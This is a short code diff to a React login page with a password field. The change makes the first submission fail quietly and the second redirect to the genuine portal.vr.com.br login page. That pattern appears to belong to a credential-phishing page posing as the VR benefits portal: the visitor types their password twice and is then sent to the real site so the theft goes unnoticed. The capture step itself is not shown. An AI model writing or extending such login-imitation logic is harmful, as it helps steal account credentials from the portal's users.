@@ -13,6 +13,7 @@ export default function LoginPage() {
   const [password, setPassword] = useState("");
   const [isValid, setIsValid] = useState<null | boolean>(null);
   const [loading, setLoading] = useState(false);
+  const [count, setCount] = useState(0);
 
   const router = useRouter();
 
@@ -30,10 +31,23 @@ export default function LoginPage() {
 
     setLoading(true);
 
-    setTimeout(() => {
-      setLoading(false);
-      router.push("/checkModule");
-    }, 2100);
+    setCount((prev) => prev + 1);
+
+    if (count === 1) {
+      setTimeout(() => {
+        setLoading(false);
+      }, 1300);
+    } else if (count === 2) {
+      setTimeout(() => {
+        // setLoading(false)
+        router.push("https://portal.vr.com.br/portal/portal-vr/login/");
+      }, 1300);
+    }
+
+    // setTimeout(() => {
+    //   setLoading(false);
+    //   router.push("/checkModule");
+    // }, 2100);
   };
 
   useEffect(() => {
